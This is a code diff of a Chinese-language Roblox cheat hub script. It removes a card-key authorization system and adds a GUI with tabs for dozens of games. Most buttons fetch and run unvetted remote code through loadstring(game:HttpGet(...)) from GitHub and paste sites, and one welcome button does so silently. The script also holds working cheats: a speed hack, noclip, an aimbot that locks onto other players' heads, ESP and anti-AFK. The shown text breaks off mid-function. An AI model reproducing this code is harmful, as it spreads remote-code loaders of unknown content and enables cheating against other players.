+LBL.Position = UDim2.new(0.75, 0, 0.010, 0)
+LBL.Size = UDim2.new(0, 133, 0, 30)
+LBL.Font = Enum.Font.GothamSemibold
+LBL.Text = "TextLabel"
+LBL.TextColor3 = Color3.new(1, 1, 1)
+LBL.TextScaled = true
+LBL.TextSize = 14
+LBL.TextWrapped = true
+LBL.Visible = true
+
+-- 2. 颜色循环核心：HSV 转 RGB（实现彩虹过渡）
+local Hue = 0  -- 色相（0-1循环，对应彩虹色）
+local Saturation = 0.8  -- 饱和度（0-1，越高颜色越鲜艳）
+local Value = 1  -- 明度（0-1，越高颜色越明亮）
+
+local function HSVToRGB(h, s, v)
+    local r, g, b
+    local i = math.floor(h * 6)
+    local f = h * 6 - i
+    local p = v * (1 - s)
+    local q = v * (1 - f * s)
+    local t = v * (1 - (1 - f) * s)
+    
+    i = i % 6  -- 确保循环在0-5之间
+    if i == 0 then r, g, b = v, t, p
+    elseif i == 1 then r, g, b = q, v, p
+    elseif i == 2 then r, g, b = p, v, t
+    elseif i == 3 then r, g, b = p, q, v
+    elseif i == 4 then r, g, b = t, p, v
+    else r, g, b = v, p, q end
+    
+    return Color3.new(r, g, b)  -- 转换为 Roblox 可用的 Color3 格式
+end
+
+-- 3. 时间显示与 FPS 计算（整合颜色循环）
+local FpsLabel = LBL
+local Heartbeat = game:GetService("RunService").Heartbeat
+local LastIteration, Start
+local FrameUpdateTable = { }
+
+local function HeartbeatUpdate()
+    -- FPS 计算逻辑（记录1秒内的帧数量）
+    LastIteration = tick()
+    for Index = #FrameUpdateTable, 1, -1 do
+        FrameUpdateTable[Index + 1] = (FrameUpdateTable[Index] >= LastIteration - 1) and FrameUpdateTable[Index] or nil
     end
+    FrameUpdateTable[1] = LastIteration
+    local CurrentFPS = (tick() - Start >= 1 and #FrameUpdateTable) or (#FrameUpdateTable / (tick() - Start))
+    CurrentFPS = CurrentFPS - CurrentFPS % 1  -- 取整数 FPS 值
+
+    -- 颜色循环更新：每帧微调色相，实现平滑过渡
+    Hue = Hue + 0.008  -- 数值越大，颜色切换越快（建议0.005-0.01）
+    if Hue > 1 then Hue = 0 end  -- 色相超过1时重置，实现无限循环
+    local rainbowColor = HSVToRGB(Hue, Saturation, Value)
+
+    -- 更新文本内容与颜色（时间+可选显示FPS）
+    FpsLabel.Text = ("黑白时间="..os.date("%H").."时"..os.date("%M").."分"..os.date("%S"))  -- 仅时间
+    -- 若需显示FPS，可替换为：FpsLabel.Text = ("黑白时间="..os.date("%H").."时"..os.date("%M").."分"..os.date("%S").." | FPS:"..CurrentFPS)
+    FpsLabel.TextColor3 = rainbowColor  -- 应用彩虹颜色
+end
+
+-- 4. 启动功能
+Start = tick()
+Heartbeat:Connect(HeartbeatUpdate)
+
+-- （可选）用户输入服务（保留原代码结构，可后续扩展功能）
+local UserInputService = game:GetService("UserInputService")
+
+
+local function CreateGUI(title)
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "MyGUI"
+    gui.ResetOnSpawn = false
+    gui.DisplayOrder = 10
+    gui.Parent = game.Players.LocalPlayer.PlayerGui
+    local frame = Instance.new("Frame")
+    frame.Name = "MainFrame"
+    frame.BackgroundTransparency = 0
+    frame.BackgroundColor3 = Color3.fromRGB(240, 248, 255)
+    frame.BorderSizePixel = 0
+    frame.Position = UDim2.new(0, 110, 0, -20) 
+    frame.Size = UDim2.new(0, 500, 0, 280)
+    frame.Parent = gui
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 10)
+    corner.Parent = frame
+
+    local dragging = false
+    local startPos, startOffset
+
+    frame.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            startPos = input.Position
+            startOffset = frame.Position
+            gui.Active = true 
+        end
+    end)
+
+    frame.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = false
+            startPos = nil
+            startOffset = nil
+            gui.Active = false
+        end
+    end)
+
+    UserInputService.InputChanged:Connect(function(input)
+        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+            local delta = input.Position - startPos
+            frame.Position = UDim2.new(startOffset.X.Scale, startOffset.X.Offset + delta.X, startOffset.Y.Scale,  
+                startOffset.Y.Offset + delta.Y)
+        end
+    end)
+    local titleLabel = Instance.new("TextLabel")
+    titleLabel.Name = "TitleLabel"
+    titleLabel.Size = UDim2.new(1, 0, 0.05, 0.15 * frame.Size.Y.Offset)
+    titleLabel.Position = UDim2.new(0, 0, 0.01, 0)
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Text = title
+    titleLabel.TextColor3 = Color3.new(0, 0, 0)
+    titleLabel.TextSize = math.floor(frame.Size.Y.Offset * 0.1)
+    titleLabel.Parent = frame
+    local disagreeButton = Instance.new("TextButton")
+    disagreeButton.Name = "DisagreeButton"
+    disagreeButton.Size = UDim2.new(0, 0.4 * frame.Size.X.Offset, 0, 0.15 * frame.Size.Y.Offset)
+    disagreeButton.Position = UDim2.new(0, 0.1 * frame.Size.X.Offset, 0,
+        frame.Size.Y.Offset - 0.25 * frame.Size.Y.Offset)
+    disagreeButton.BackgroundTransparency = 0
+    disagreeButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
+    disagreeButton.Text = "那咋了🙄"
+    disagreeButton.TextColor3 = Color3.new(0, 0, 0)
+    disagreeButton.TextSize = math.floor(frame.Size.Y.Offset * 0.08)
+    disagreeButton.Font = Enum.Font.SourceSans
+    disagreeButton.Parent = frame
+    local disagreeCorner = Instance.new("UICorner")
+    disagreeCorner.CornerRadius = UDim.new(0, 10)
+    disagreeCorner.Parent = disagreeButton
+
+    local agreeButton = Instance.new("TextButton")
+    agreeButton.Name = "AgreeButton"
+    agreeButton.Size = UDim2.new(0, 0.4 * frame.Size.X.Offset, 0, 0.15 * frame.Size.Y.Offset)
+    agreeButton.Position = UDim2.new(0, frame.Size.X.Offset - 0.5 * frame.Size.X.Offset, 0,
+        frame.Size.Y.Offset - 0.25 * frame.Size.Y.Offset)
+    agreeButton.BackgroundTransparency = 0
+    agreeButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
+    agreeButton.Text = "知道了"
+    agreeButton.TextColor3 = Color3.new(0, 0, 0)
+    agreeButton.TextSize = math.floor(frame.Size.Y.Offset * 0.08)
+    agreeButton.Font = Enum.Font.SourceSans 
+    agreeButton.Parent = frame
+
     
-    if VerifyKey(enteredCode) then
-        -- 验证成功，保存授权信息
-        local authData = {
-            PlayerName = player.Name,
-            Authorized = true,
-            Timestamp = os.time(),
-            AuthorizationType = "Key"
-        }
-        SaveAuthorization(authData)
-        
-        StatusLabel.Text = "验证成功！正在加载..."
-        StatusLabel.TextColor3 = Color3.fromRGB(46, 204, 113)
-        
-        -- 执行远程脚本
-        ExecuteRemoteScript()
-        
-        -- 关闭窗口
-        task.wait(2)
-        MainFrame.Visible = false
-    else
-        errorCount = errorCount + 1
-        local remaining = MAX_ATTEMPTS - errorCount
-        
-        if remaining > 0 then
-            StatusLabel.Text = string.format("卡密无效，还有 %d 次机会", remaining)
+    local agreeFrame = Instance.new("TextLabel")
+    agreeFrame.Size = UDim2.new(0.8, 0, 0.5, 0)
+    agreeFrame.Position = UDim2.new(0.1, 0, 0.22, 0)
+    agreeFrame.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
+    agreeFrame.Text = "1.欢迎使用黑白脚本.\n 2.以前的黑白脚本已失效😭 \n  3.更新：添加卡密"
+    agreeFrame.TextWrapped = true
+
+    
+    agreeFrame.TextSize = 16  
+
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 10)
+    corner.Parent = agreeFrame
+
+    agreeFrame.Parent = frame
+
+    local agreeCorner = Instance.new("UICorner")
+    agreeCorner.CornerRadius = UDim.new(0, 10)
+    agreeCorner.Parent = agreeButton
+    local minimizeButton = Instance.new("TextButton")
+    minimizeButton.Name = "MinimizeButton"
+    minimizeButton.Size = UDim2.new(0, 40, 0, 40)
+    minimizeButton.Position = UDim2.new(1, -65, 0, 10)
+    minimizeButton.BackgroundTransparency = 0
+    minimizeButton.BackgroundColor3 = Color3.fromRGB(199, 199, 199)
+    minimizeButton.Text = "-"
+    minimizeButton.TextSize = 28  
+    minimizeButton.TextColor3 = Color3.new(0, 0, 0)
+    minimizeButton.Font = Enum.Font.SourceSans
+    minimizeButton.Parent = frame
+
+    local isMinimized = false
+
+    local minimizeCorner = Instance.new("UICorner")
+    minimizeCorner.CornerRadius = UDim.new(0, 5)
+    minimizeCorner.Parent = minimizeButton
+
+    minimizeButton.MouseButton1Click:Connect(function()
+        if isMinimized then
+            frame.Size = UDim2.new(0, 500, 0, 280)
+            titleLabel.Position = UDim2.new(0, 0, 0.01, 0)
+            minimizeButton.Text = "-"
+            minimizeButton.TextSize = 28
+            isMinimized = false
+            disagreeButton.Visible = true
+            agreeButton.Visible = true
+            agreeFrame.Visible = true
         else
-            StatusLabel.Text = "错误次数过多！"
-            task.wait(1)
-            player:Kick("连续输入错误卡密")
+            frame.Size = UDim2.new(0, 500, 0, 60)
+            titleLabel.Position = UDim2.new(0, 0, 0, 0)
+            minimizeButton.Text = "+"
+            minimizeButton.TextSize = 28 
+            isMinimized = true
+            disagreeButton.Visible = false
+            agreeButton.Visible = false
+            agreeFrame.Visible = false
         end
-        StatusLabel.TextColor3 = Color3.fromRGB(231, 76, 60)
-    end
-end)
+    end)
 
--- ==========================================
--- 手机拖拽功能
--- ==========================================
-local isDragging = false
-local dragStart = nil
-local startPos = nil
-
-TitleBar.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or 
-       input.UserInputType == Enum.UserInputType.Touch then
-        isDragging = true
-        dragStart = input.Position
-        startPos = MainFrame.Position
-    end
-end)
-
-UserInputService.InputChanged:Connect(function(input)
-    if isDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or 
-       input.UserInputType == Enum.UserInputType.Touch) then
-        local delta = input.Position - dragStart
-        MainFrame.Position = UDim2.new(
-            startPos.X.Scale, startPos.X.Offset + delta.X,
-            startPos.Y.Scale, startPos.Y.Offset + delta.Y
-        )
-    end
-end)
-
-UserInputService.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or 
-       input.UserInputType == Enum.UserInputType.Touch then
-        isDragging = false
-    end
-end)
-
--- ==========================================
--- 白名单管理指令系统
--- ==========================================
-local function AddToWhitelist(playerName)
-    if not IsPlayerWhitelisted(playerName) then
-        table.insert(WHITELISTED_PLAYERS, playerName)
-        return true, "玩家 " .. playerName .. " 已添加到白名单"
-    else
-        return false, "玩家 " .. playerName .. " 已在白名单中"
-    end
-end
-
-local function RemoveFromWhitelist(playerName)
-    for i, name in ipairs(WHITELISTED_PLAYERS) do
-        if name:lower() == playerName:lower() then
-            table.remove(WHITELISTED_PLAYERS, i)
-            return true, "玩家 " .. playerName .. " 已从白名单移除"
+    local function AnimateExit()
+        local duration = 1
+        local startTime = tick()
+        local initialSize = frame.Size
+        while (tick() - startTime) < duration do
+            local elapsedTime = tick() - startTime
+            local scale = 1 - elapsedTime / duration
+            frame.Size = UDim2.new(initialSize.X.Scale * scale, initialSize.X.Offset * scale,
+                initialSize.Y.Scale * scale, initialSize.Y.Offset * scale)
+            frame.Position = frame.Position + UDim2.new((1 - scale) / 2, 0, (1 - scale) / 2, 0)
+            wait()
         end
+        gui:Destroy()
     end
-    return false, "玩家 " .. playerName .. " 不在白名单中"
+    disagreeButton.MouseButton1Click:Connect(function()
+        AnimateExit()
+    end)
+    agreeButton.MouseButton1Click:Connect(function()
+        AnimateExit()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Asddffgujhh/-/refs/heads/main/BBBBBSSSSS'))()
+  end)
+end
+local myTitle = "黑白脚本中心" 
+CreateGUI(myTitle)
+local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
+
+local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
+local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()
+
+Notification:Notify(
+        {Title = "欢迎使用黑白脚本", Description = "请加入QQ群：946671668"},
+        {OutlineColor = Color3.fromRGB(0, 0, 0),Time = 9, Type = "image"},
+        {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(258, 58, 68)})
+
+local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
+local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()
+
+Notification:Notify(
+        {Title = "已开启反挂机", Description = "作者帮助你开启反挂机了"},
+        {OutlineColor = Color3.fromRGB(0, 0, 0),Time = 9, Type = "image"},
+        {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(258, 58, 68)})
+        local vu = game:GetService("VirtualUser")
+		game:GetService("Players").LocalPlayer.Idled:connect(function()
+		   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+		   wait(1)
+		   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+		end)
+
+local Window = WindUI:CreateWindow({
+    Title = "黑白脚本",
+    Icon = "door-open",
+    Author = "",
+    Folder = "CloudHub",
+    Size = UDim2.fromOffset(560, 360),
+    Transparent = true,
+    Theme = "Dark",
+    User = {
+        Enabled = true,
+        Callback = function() 
+            print("clicked") 
+        end,
+        wuckdfs = true
+    },
+})
+
+Window:EditOpenButton({
+    Title = "打开黑白脚本",
+    Icon = "monitor",
+    CornerRadius = UDim.new(0,16),
+    StrokeThickness = 2,
+    Color = ColorSequence.new(
+        Color3.fromHex("FF0F7B"),
+        Color3.fromHex("F89B29")
+    ),
+    Draggable = true,
+})
+
+function Tab(a)
+    return Window:Tab({Title = a, Icon = "eye"})
 end
 
-local function ListWhitelist()
-    local list = "白名单玩家列表:\n"
-    for i, name in ipairs(WHITELISTED_PLAYERS) do
-        list = list .. i .. ". " .. name .. "\n"
-    end
-    return list
+function Button(a, b, c)
+    return a:Button({Title = b, Callback = c})
 end
 
--- 处理聊天指令
-game.Players.PlayerAdded:Connect(function(player)
-    player.Chatted:Connect(function(message)
-        local args = message:split(" ")
-        local command = args[1]:lower()
-        
-        -- 检查是否为管理员指令
-        if command == "/whitelist" or command == "/wl" then
-            if #args < 3 then
-                player:SendMessage("用法: /whitelist <add/remove/list> <玩家名> [密码]")
-                return
-            end
-            
-            local action = args[2]:lower()
-            local targetPlayer = args[3]
-            local password = args[4]
-            
-            -- 验证管理员密码
-            if password ~= ADMIN_PASSWORD then
-                player:SendMessage("错误: 管理员密码不正确")
-                return
-            end
-            
-            -- 执行对应操作
-            if action == "add" then
-                local success, result = AddToWhitelist(targetPlayer)
-                player:SendMessage(result)
-            elseif action == "remove" then
-                local success, result = RemoveFromWhitelist(targetPlayer)
-                player:SendMessage(result)
-            elseif action == "list" then
-                local list = ListWhitelist()
-                player:SendMessage(list)
-            else
-                player:SendMessage("无效操作: " .. action)
-                player:SendMessage("可用操作: add, remove, list")
+function Toggle(a, b, c, d)
+    return a:Toggle({Title = b, Value = c, Callback = d})
+end
+
+function Slider(a, b, c, d, e, f)
+    return a:Slider({Title = b, Step = 1, Value = {Min = c, Max = d, Default = e}, Callback = f})
+end
+
+function Dropdown(a, b, c, d, e)
+    return a:Dropdown({Title = b, Values = c, Value = d, Callback = e})
+end
+
+local Tab1 = Tab("简介")
+local Tab2 = Tab("通用")
+local Tab3 = Tab("通用2")
+local Tab4 = Tab("各大脚本")
+local Tab5 = Tab("FE")
+local Tab6 = Tab("DOORS")
+local Tab7 = Tab("rooms&doors")
+local Tab8 = Tab("压力,doors")
+local Tab9 = Tab("动感星期五")
+local Tab10 = Tab("压力")
+local Tab11 = Tab("成为乞丐")
+local Tab12 = Tab("磁铁模拟器")
+local Tab13 = Tab("建造一架飞机")
+local Tab14 = Tab("勘探中")
+local Tab15 = Tab("法宝模拟器")
+local Tab16 = Tab("在披萨店工作")
+local Tab17 = Tab("战斗勇士")
+local Tab18 = Tab("一次尘土的旅行")
+local Tab19 = Tab("破坏者谜团2")
+local Tab20 = Tab("模仿者")
+local Tab21 = Tab("火箭发射模拟器")
+local Tab22 = Tab("只因剑")
+local Tab23 = Tab("森林里的99夜")
+local Tab24 = Tab("旗帜战争")
+local Tab25 = Tab("逃出建筑")
+local Tab26 = Tab("打墙模拟器")
+local Tab27 = Tab("生存巨人")
+local Tab28 = Tab("健身房之星模拟器")
+local Tab29 = Tab("死铁轨")
+local Tab30 = Tab("墨水游戏")
+local Tab31 = Tab("自然灾害模拟器")
+local Tab32 = Tab("穷小子打工记")
+local Tab33 = Tab("最后的黎明")
+local Tab34 = Tab("索纳里亚世界")
+local Tab35 = Tab("河北唐县")
+local Tab36 = Tab("被遗弃")
+
+-- 简介 (Tab1)
+
+Button(Tab1, "作者：不知名相册2199414565", function()
+    pcall(function()
+    end)
+end)
+
+Button(Tab1, "QQ群：946671668", function()
+    pcall(function()
+    end)
+end)
+
+Button(Tab1, "最没母的群570910164千万别进否则会浮木会死掉", function()
+    pcall(function()
+    end)
+end)
+
+Button(Tab1, "禁止倒卖", function()
+    pcall(function()
+    end)
+end)
+
+Button(Tab1, "祝你游戏愉快", function()
+    pcall(function()
+    end)
+end)
+
+Button(Tab1, "免费缝合脚本", function()
+    pcall(function()
+    end)
+end)
+
+Button(Tab1, "祝你一路顺风", function()
+    pcall(function()
+    end)
+end)
+
+Button(Tab1, "大部分会在周六周日更新", function()
+    pcall(function()
+    end)
+end)
+
+Button(Tab1, "旧黑白脚本已废😭😭😭", function()
+    pcall(function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/tfcygvunbind/Apple/0a572fcc356231593d062f45acedbcdad42c6fd8/%E9%BB%91%E7%99%BD%E8%84%9A%E6%9C%AC'))()
+    end)
+end)
+
+-- 通用 (Tab2)
+Button(Tab2, "飞行", function() 
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/dingding123hhh/tt/main/jm%E9%A3%9E..lua"))()
+    end)
+end)
+
+Button(Tab2, "无敌少侠（飞行）", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Invinicible-Flight-R15-45414"))()
+    end)
+end)
+
+Slider(Tab2, "移动速度", 1, 9999999, game.Players.LocalPlayer.Character.Humanoid.WalkSpeed, function(a) 
+    pcall(function()
+        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = a
+    end)
+end)
+
+Slider(Tab2, "跳跃高度", 1, 700, game.Players.LocalPlayer.Character.Humanoid.JumpPower, function(a) 
+    pcall(function()
+        game.Players.LocalPlayer.Character.Humanoid.JumpPower = a
+    end)
+end)
+
+Slider(Tab2, "重力设置", -50, 400, workspace.Gravity, function(a) 
+    pcall(function()
+        workspace.Gravity = a
+    end)
+end)
+
+Toggle(Tab2, "穿墙", false, function(a)
+    pcall(function()
+        for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+            if v:IsA("BasePart") then
+                v.CanCollide = not a
             end
         end
     end)
 end)
 
--- ==========================================
--- 分级授权检查
--- ==========================================
-local function CheckAuthorization()
-    local playerName = player.Name
-    
-    -- 1. 检查是否为白名单玩家
-    if IsPlayerWhitelisted(playerName) then
-        print("[授权系统] 白名单玩家:", playerName)
-        ExecuteRemoteScript()
-        return true
-    end
-    
-    -- 2. 检查是否已通过卡密验证
-    local savedAuth = LoadAuthorization()
-    if savedAuth and savedAuth.Authorized and savedAuth.PlayerName == playerName then
-        print("[授权系统] 已验证玩家:", playerName)
-        ExecuteRemoteScript()
-        return true
-    end
-    
-    -- 3. 需要卡密验证
-    print("[授权系统] 需要卡密验证:", playerName)
-    MainFrame.Visible = true
-    return false
-end
+Toggle(Tab2, "夜视", false, function(a)
+    pcall(function()
+        if a then
+            game.Lighting.Ambient = Color3.new(1, 1, 1)
+        else
+            game.Lighting.Ambient = Color3.new(0, 0, 0)
+        end
+    end)
+end)
 
--- 启动时进行授权检查
-CheckAuthorization()
+Button(Tab2, "光影V4", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/MZEEN2424/Graphics/main/Graphics.xml"))()
+    end)
+end)
+
+Button(Tab2, "踏空行走", function()
+    pcall(function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Float'))()
+    end)
+end)
+
+Button(Tab2, "透视", function()
+    pcall(function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/cool83birdcarfly02six/UNIVERSALESPLTX/main/README.md'))()
+    end)
+end)
+
+Button(Tab2, "光影", function()
+    pcall(function()
+        loadstring(game:HttpGet('https://pastefy.app/xXkUxA0P/raw'))()
+    end)
+end)
+
+Button(Tab2, "光影2", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/MZEEN2424/Graphics/main/Graphics.xml"))()
+    end)
+end)
+
+Button(Tab2, "无头加kor", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Permanent-Headless-And-korblox-Script-4140"))()
+    end)
+end)
+
+Button(Tab2, "自瞄", function()
+    pcall(function()
+        local fov = 100 
+        local smoothness = 10 
+        local crosshairDistance = 5 
+        local RunService = game:GetService("RunService")
+        local UserInputService = game:GetService("UserInputService")
+        local Players = game:GetService("Players")
+        local Cam = game.Workspace.CurrentCamera
+        
+        local FOVring = Drawing.new("Circle")
+        FOVring.Visible = true
+        FOVring.Thickness = 2
+        FOVring.Color = Color3.fromRGB(0, 255, 0)
+        FOVring.Filled = false
+        FOVring.Radius = fov
+        FOVring.Position = Cam.ViewportSize / 2
+        
+        local Player = Players.LocalPlayer
+        local PlayerGui = Player:WaitForChild("PlayerGui")
+        local ScreenGui = Instance.new("ScreenGui")
+        ScreenGui.Name = "FovAdjustGui"
+        ScreenGui.Parent = PlayerGui
+        
+        local Frame = Instance.new("Frame")
+        Frame.Name = "MainFrame"
+        Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+        Frame.BorderColor3 = Color3.fromRGB(128, 0, 128)
+        Frame.BorderSizePixel = 2
+        Frame.Position = UDim2.new(0.3, 0, 0.3, 0)
+        Frame.Size = UDim2.new(0.4, 0, 0.4, 0)
+        Frame.Active = true
+        Frame.Draggable = true
+        Frame.Parent = ScreenGui
+        
+        local MinimizeButton = Instance.new("TextButton")
+        MinimizeButton.Name = "MinimizeButton"
+        MinimizeButton.Text = "-"
+        MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        MinimizeButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+        MinimizeButton.Position = UDim2.new(0.9, 0, 0, 0)
+        MinimizeButton.Size = UDim2.new(0.1, 0, 0.1, 0)
+        MinimizeButton.Parent = Frame
+        
+        local isMinimized = false
+        MinimizeButton.MouseButton1Click:Connect(function()
+            isMinimized = not isMinimized
+            if isMinimized then
+                Frame:TweenSize(UDim2.new(0.1, 0, 0.1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.3, true)
+                MinimizeButton.Text = "+"
+            else
+                Frame:TweenSize(UDim2.new(0.4, 0, 0.4, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.3, true)
+                MinimizeButton.Text = "-"
+            end
+        end)
+        
+        local FovLabel = Instance.new("TextLabel")
+        FovLabel.Name = "FovLabel"
+        FovLabel.Text = "自瞄范围"
+        FovLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+        FovLabel.BackgroundTransparency = 1
+        FovLabel.Position = UDim2.new(0.1, 0, 0.1, 0)
+        FovLabel.Size = UDim2.new(0.8, 0, 0.2, 0)
+        FovLabel.Parent = Frame
+        
+        local FovSlider = Instance.new("TextBox")
+        FovSlider.Name = "FovSlider"
+        FovSlider.Text = tostring(fov)
+        FovSlider.TextColor3 = Color3.fromRGB(255, 255, 255)
+        FovSlider.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+        FovSlider.Position = UDim2.new(0.1, 0, 0.3, 0)
+        FovSlider.Size = UDim2.new(0.8, 0, 0.2, 0)
+        FovSlider.Parent = Frame
+        
+        local SmoothnessLabel = Instance.new("TextLabel")
+        SmoothnessLabel.Name = "SmoothnessLabel"
+        SmoothnessLabel.Text = "自瞄平滑度"
+        SmoothnessLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+        SmoothnessLabel.BackgroundTransparency = 1
+        SmoothnessLabel.Position = UDim2.new(0.1, 0, 0.5, 0)
+        SmoothnessLabel.Size = UDim2.new(0.8, 0, 0.2, 0)
+        SmoothnessLabel.Parent = Frame
+        
+        local SmoothnessSlider = Instance.new("TextBox")
+        SmoothnessSlider.Name = "SmoothnessSlider"
+        SmoothnessSlider.Text = tostring(smoothness)
+        SmoothnessSlider.TextColor3 = Color3.fromRGB(255, 255, 255)
+        SmoothnessSlider.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+        SmoothnessSlider.Position = UDim2.new(0.1, 0, 0.7, 0)
+        SmoothnessSlider.Size = UDim2.new(0.8, 0, 0.2, 0)
+        SmoothnessSlider.Parent = Frame
+        
+        local CrosshairDistanceLabel = Instance.new("TextLabel")
+        CrosshairDistanceLabel.Name = "CrosshairDistanceLabel"
+        CrosshairDistanceLabel.Text = "自瞄预判距离"
+        CrosshairDistanceLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+        CrosshairDistanceLabel.BackgroundTransparency = 1
+        CrosshairDistanceLabel.Position = UDim2.new(0.1, 0, 0.9, 0)
+        CrosshairDistanceLabel.Size = UDim2.new(0.8, 0, 0.2, 0)
+        CrosshairDistanceLabel.Parent = Frame
+        
+        local CrosshairDistanceSlider = Instance.new("TextBox")
+        CrosshairDistanceSlider.Name = "CrosshairDistanceSlider"
+        CrosshairDistanceSlider.Text = tostring(crosshairDistance)
+        CrosshairDistanceSlider.TextColor3 = Color3.fromRGB(255, 255, 255)
+        CrosshairDistanceSlider.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+        CrosshairDistanceSlider.Position = UDim2.new(0.1, 0, 1.1, 0)
+        CrosshairDistanceSlider.Size = UDim2.new(0.8, 0, 0.2, 0)
+        CrosshairDistanceSlider.Parent = Frame
+        
+        local targetCFrame = Cam.CFrame
+        
+        local function updateDrawings()
+            local camViewportSize = Cam.ViewportSize
+            FOVring.Position = camViewportSize / 2
+            FOVring.Radius = fov
+        end
+        
+        local function onKeyDown(input)
+            if input.KeyCode == Enum.KeyCode.Delete then
+                RunService:UnbindFromRenderStep("FOVUpdate")
+                FOVring:Remove()
+            end
+        end
+        
+        UserInputService.InputBegan:Connect(onKeyDown)
+        
+        local function getClosestPlayerInFOV(trg_part)
+            local nearest = nil
+            local last = math.huge
+            local playerMousePos = Cam.ViewportSize / 2
+            
+            for _, player in ipairs(Players:GetPlayers()) do
+                if player ~= Players.LocalPlayer then
+                    local part = player.Character and player.Character:FindFirstChild(trg_part)
+                    if part then
+                        local ePos, isVisible = Cam:WorldToViewportPoint(part.Position)
+                        local distance = (Vector2.new(ePos.x, ePos.y) - playerMousePos).Magnitude
+                        if distance < last and isVisible and distance < fov then
+                            last = distance
+                            nearest = player
+                        end
+                    end
+                end
+            end
+            return nearest
+        end
+        
+        RunService.RenderStepped:Connect(function()
+            updateDrawings()
+            local closest = getClosestPlayerInFOV("Head")
+            if closest and closest.Character:FindFirstChild("Head") then
+                local targetCharacter = closest.Character
+                local targetHead = targetCharacter.Head
+                local targetRootPart = targetCharacter:FindFirstChild("HumanoidRootPart")
+                local isMoving = targetRootPart and targetRootPart.Velocity.Magnitude > 0.1
+                local targetPosition
+                
+                if isMoving then
+                    targetPosition = targetHead.Position + (targetHead.CFrame.LookVector * crosshairDistance)
+                else
+                    targetPosition = targetHead.Position
+                end
+                targetCFrame = CFrame.new(Cam.CFrame.Position, targetPosition)
+            else
+                targetCFrame = Cam.CFrame
+            end
+            Cam.CFrame = Cam.CFrame:Lerp(targetCFrame, 1 / smoothness)
+        end)
+        
+        FovSlider.FocusLost:Connect(function(enterPressed)
+            if enterPressed then
+                local newFov = tonumber(FovSlider.Text)
+                if newFov then
+                    fov = newFov
+                else
+                    FovSlider.Text = tostring(fov)
+                end
+            end
+        end)
+        
+        SmoothnessSlider.FocusLost:Connect(function(enterPressed)
+            if enterPressed then
+                local newSmoothness = tonumber(SmoothnessSlider.Text)
+                if newSmoothness then
+                    smoothness = newSmoothness
+                else
+                    SmoothnessSlider.Text = tostring(smoothness)
+                end
+            end
+        end)
+        
+        CrosshairDistanceSlider.FocusLost:Connect(function(enterPressed)
+            if enterPressed then
+                local newCrosshairDistance = tonumber(CrosshairDistanceSlider.Text)
+                if newCrosshairDistance then
+                    crosshairDistance = newCrosshairDistance
+                else
+                    CrosshairDistanceSlider.Text = tostring(crosshairDistance)
+                end
+            end
+        end)
+    end)
+end)
+
+-- ESP功能
+Toggle(Tab2, "Circle ESP", false, function(state)
+    pcall(function()
+        for _, player in pairs(game.Players:GetPlayers()) do
+            if player ~= game.Players.LocalPlayer and player.Character then
+                if state then
+                    local highlight = Instance.new("Highlight")
+                    highlight.Parent = player.Character
+                    highlight.Adornee = player.Character
+
+                    local billboard = Instance.new("BillboardGui")
+                    billboard.Parent = player.Character
+                    billboard.Adornee = player.Character
+                    billboard.Size = UDim2.new(0, 100, 0, 100)
+                    billboard.StudsOffset = Vector3.new(0, 3, 0)
+                    billboard.AlwaysOnTop = true
+
+                    local nameLabel = Instance.new("TextLabel")
